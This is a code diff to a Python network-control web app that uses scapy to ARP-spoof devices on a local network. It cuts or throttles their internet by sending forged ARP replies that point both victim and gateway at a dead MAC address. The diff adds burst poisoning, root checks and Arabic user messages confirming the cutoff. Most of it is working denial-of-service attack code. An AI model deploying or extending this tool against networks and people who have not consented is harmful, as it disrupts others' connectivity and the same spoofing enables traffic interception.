@@ -198,26 +198,35 @@ def arp_control_loop():
 
     while True:
         try:
-            # 1. Handle Blocked Devices
+            is_root = (os.geteuid() == 0 if hasattr(os, "geteuid") else False)
+            if not is_root and (BLOCKED_IPS or THROTTLED_IPS):
+                print("[!] Warning: Root permissions (sudo) required on macOS to inject raw ARP packets.")
+                time.sleep(3.0)
+                continue
+
+            conf.iface = MY_INTERFACE
+
+            # 1. Handle Blocked Devices (High-frequency burst poisoning)
             for ip in list(BLOCKED_IPS):
                 if ip in DEVICES and GATEWAY_MAC:
                     target_mac = DEVICES[ip]["mac"]
-                    # Poison target: Gateway is pointing to invalid address
+                    # Poison target: Gateway points to dead MAC
                     pkt1 = ARP(op=2, pdst=ip, hwdst=target_mac, psrc=GATEWAY_IP, hwsrc="00:00:00:00:00:01")
+                    # Poison Gateway: Target points to dead MAC
                     pkt2 = ARP(op=2, pdst=GATEWAY_IP, hwdst=GATEWAY_MAC, psrc=ip, hwsrc="00:00:00:00:00:01")
-                    send(pkt1, verbose=False)
-                    send(pkt2, verbose=False)
+                    send(pkt1, count=3, inter=0.05, verbose=False)
+                    send(pkt2, count=3, inter=0.05, verbose=False)
 
-            # 2. Handle Throttled Devices (Packet Pacing / Intermittent ARP interruption)
+            # 2. Handle Throttled Devices (Pacing / intermittent delay)
             for ip, limit in list(THROTTLED_IPS.items()):
                 if ip in DEVICES and GATEWAY_MAC:
                     target_mac = DEVICES[ip]["mac"]
-                    # Intermittent ARP spoofing drops packet ratio to enforce bandwidth throttle
                     pkt = ARP(op=2, pdst=ip, hwdst=target_mac, psrc=GATEWAY_IP, hwsrc="00:00:00:00:00:01")
-                    send(pkt, verbose=False)
+                    send(pkt, count=2, inter=0.1, verbose=False)
 
-            time.sleep(1.0)
+            time.sleep(0.3 if BLOCKED_IPS else 1.0)
         except Exception as e:
+            print(f"[!] ARP loop error: {e}")
             time.sleep(2.0)
 
 # Restore normal ARP
@@ -225,12 +234,13 @@ def restore_arp(target_ip: str):
     try:
         from scapy.all import ARP, send, conf
         conf.verb = 0
+        conf.iface = MY_INTERFACE
         if target_ip in DEVICES and GATEWAY_MAC:
             target_mac = DEVICES[target_ip]["mac"]
             pkt1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=GATEWAY_IP, hwsrc=GATEWAY_MAC)
             pkt2 = ARP(op=2, pdst=GATEWAY_IP, hwdst=GATEWAY_MAC, psrc=target_ip, hwsrc=target_mac)
-            send(pkt1, count=5, verbose=False)
-            send(pkt2, count=5, verbose=False)
+            send(pkt1, count=8, inter=0.05, verbose=False)
+            send(pkt2, count=8, inter=0.05, verbose=False)
     except Exception as e:
         print(f"[!] Error restoring ARP: {e}")
 
@@ -281,7 +291,13 @@ def block_device(req: BlockRequest):
         del THROTTLED_IPS[req.ip]
     if req.ip in DEVICES:
         DEVICES[req.ip]["status"] = "blocked"
-    return {"status": "ok", "message": f"تم قطع النت عن الجهاز {req.ip}"}
+    is_root = (os.geteuid() == 0 if hasattr(os, "geteuid") else False)
+    if not is_root:
+        return {
+            "status": "warning",
+            "message": f"تم وضع {req.ip} في قائمة الحظر. تنبيه: لتطبيق قطع النت الفعلي من الماك يتطلب تشغيل السيرفر بـ: sudo ./run.sh (الماك يمنع حقن الحزم بدون روت). أو افصله مباشرة من صفحة الراوتر (192.168.1.1)."
+        }
+    return {"status": "ok", "message": f"تم قطع النت عن الجهاز {req.ip} بنجاح"}
 
 @app.post("/api/unblock")
 def unblock_device(req: BlockRequest):
@@ -305,6 +321,12 @@ def throttle_device(req: ThrottleRequest):
     if req.ip in DEVICES:
         DEVICES[req.ip]["status"] = "throttled"
         DEVICES[req.ip]["speed_limit"] = req.rate_kbps
+    is_root = (os.geteuid() == 0 if hasattr(os, "geteuid") else False)
+    if not is_root:
+        return {
+            "status": "warning",
+            "message": f"تم تعيين حد {req.rate_kbps} Kbps. تنبيه: يتطلب تشغيل السيرفر بـ sudo ./run.sh لخنق السرعة الفعلي."
+        }
     return {"status": "ok", "message": f"تم تقييد سرعة الجهاز {req.ip} إلى {req.rate_kbps} Kbps"}
 
 # Serve Frontend
